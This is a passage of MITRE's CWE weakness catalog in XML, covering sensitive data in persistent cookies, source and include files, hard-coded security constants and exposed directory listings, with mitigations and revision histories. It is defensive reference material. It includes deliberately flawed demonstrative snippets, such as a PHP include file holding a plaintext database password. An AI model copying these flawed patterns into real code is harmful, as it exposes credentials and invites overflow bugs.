               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Description, Maintenance_Notes, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2010-09-09</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Name, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-12-28">File and Directory Information Leaks</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">File and Directory Information Exposure</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="539" Name="Use of Persistent Cookies Containing Sensitive Information" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The web application uses persistent cookies, but the cookies contain sensitive information.</Description>
         <Extended_Description>Cookies are small bits of data that are sent by the web application but stored locally in the browser. This lets the application use the cookie to pass information between pages and store variable information. The web application controls what information is stored in a cookie and how it is used. Typical types of information stored in cookies are session identifiers, personalization and customization information, and in rare cases even usernames to enable automated logins. There are two different types of cookies: session cookies and persistent cookies. Session cookies just live in the browser's memory and are not stored anywhere, but persistent cookies are stored on the browser's hard drive.   This can cause security and privacy issues depending on the information stored in the cookie and how it is accessed.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="552" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not store sensitive information in persistent cookies.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="39"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Name, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2011-03-29">Information Leak Through Persistent Cookies</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Information Exposure Through Persistent Cookies</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="540" Name="Inclusion of Sensitive Information in Source Code" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>Source code on a web server or repository often contains sensitive information and should generally not be accessible to users.</Description>
         <Extended_Description>There are situations where it is critical to remove source code from an area or server. For example, obtaining Perl source code on a system allows an attacker to understand the logic of the script and extract extremely useful information such as code bugs or logins and passwords.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>System Configuration</Phase>
               <Description>Recommendations include removing this script from the web server and moving it to a location not accessible from the Internet.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Name, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2011-03-29">Information Leak Through Source Code</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Information Exposure Through Source Code</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="541" Name="Inclusion of Sensitive Information in an Include File" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>If an include file source is accessible, the file can contain usernames and passwords, as well as sensitive information pertaining to the application and system.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="540" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not store sensitive information in include files.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>System Configuration</Phase>
               <Description>Protect include files from being exposed.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-104">
               <Intro_Text>The following code uses an include file to store database credentials:</Intro_Text>
               <Body_Text>database.inc</Body_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>&lt;?php<xhtml:br/>$dbName = 'usersDB';<xhtml:br/>$dbPassword = 'skjdh#67nkjd3$3$';<xhtml:br/>?&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>login.php</Body_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>&lt;?php<xhtml:br/>include('database.inc');<xhtml:br/>$db = connectToDB($dbName, $dbPassword);<xhtml:br/>$db.authenticateUser($username, $password);<xhtml:br/>?&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>If the server does not have an explicit handler set for .inc files it may send the contents of database.inc to an attacker without pre-processing, if the attacker requests the file directly. This will expose the database name and password.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Name, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2011-03-29">Information Leak Through Include Source Code</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Information Exposure Through Include Source Code</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="547" Name="Use of Hard-coded, Security-relevant Constants" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product uses hard-coded constants instead of symbolic names for security-critical values, which increases the likelihood of mistakes during code maintenance or security policy change.</Description>
         <Extended_Description>If the developer does not find all occurrences of the hard-coded constants, an incorrect policy decision may be made if one of the constants is not changed. Making changes to these values will require code changes that may be difficult or impossible once the system is released to the field. In addition, these hard-coded values may become available to attackers if the code is ever disclosed.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1078" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Indirect</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
               <Impact>Quality Degradation</Impact>
               <Note>The existence of hardcoded constants could cause unexpected behavior and the introduction of weaknesses during code maintenance or when making changes to the code if all occurrences are not modified. The use of hardcoded constants is an indication of poor quality.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Avoid using hard-coded constants. Configuration files offer a more flexible solution.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The usage of symbolic names instead of hard-coded constants is preferred.</Intro_Text>
               <Body_Text>The following is an example of using a hard-coded constant instead of a symbolic name.</Body_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>char buffer[1024];<xhtml:br/>...<xhtml:br/>fgets(buffer, 1024, stdin);</xhtml:div>
               </Example_Code>
               <Body_Text>If the buffer value needs to be changed, then it has to be altered in more than one place. If the developer forgets or does not find all occurences, in this example it could lead to a buffer overflow.</Body_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>enum { MAX_BUFFER_SIZE = 1024 };<xhtml:br/>...<xhtml:br/>char buffer[MAX_BUFFER_SIZE];<xhtml:br/>...<xhtml:br/>fgets(buffer, MAX_BUFFER_SIZE, stdin);</xhtml:div>
               </Example_Code>
               <Body_Text>In this example the developer will only need to change one value and all references to the buffer size are updated, as a symbolic name is used instead of a hard-coded constant.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>DCL06-C</Entry_ID>
               <Entry_Name>Use meaningful symbolic constants to represent literal values in program logic</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Weakness_Ordinalities</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Security-relevant Constants</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="548" Name="Exposure of Information Through Directory Listing" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.</Description>
         <Extended_Description>A directory listing provides an attacker with the complete index of all the resources located inside of the directory. The specific risks and consequences vary depending on which files are listed and accessible.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="497" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Note>Exposing the contents of a directory can lead to an attacker gaining access to source code or providing useful information for the attacker to devise exploits, such as creation times of files or any information that may be encoded in file names. The directory listing may also compromise private or confidential data.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>System Configuration</Phase>
               <Description>Recommendations include restricting access to important directories or files by adopting a need to know requirement for both the document and server root, and turning off features such as Automatic Directory Listings that could expose private files and provide information that could be utilized by an attacker when formulating or conducting an attack.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Insecure Configuration Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>16</Entry_ID>
               <Entry_Name>Directory Indexing</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
